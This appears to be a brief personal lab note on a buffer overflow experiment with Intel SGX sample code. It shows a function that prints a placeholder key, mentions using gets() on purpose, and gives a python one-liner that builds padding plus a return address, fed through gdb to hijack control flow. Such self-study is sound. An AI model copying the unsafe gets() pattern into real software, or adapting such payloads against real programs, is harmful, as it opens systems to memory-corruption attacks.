# Buffer Overflow (Based on the intel sample codes SampleEnclave)

```
void getkey(){
    printf("The key is: Blah Blah Blah\n");
}
```
This code is placed outside of Enclave 
We use gets() ... Yes I don't care for realistic situations not yet
So basically, sgxsdk is as fancy as it is just code.

Next we test how the same method works for when that function is placed inside the enclave.
How can I do that? Well I have to find out

```
python -c "print 'aaaaaaaaaaaaaaaaaabbbbbb'+b'\xa0\x1d\x40\x00\x00\x00'"  > tmp
```
and we pass tmp through gdb. Crude method but it works
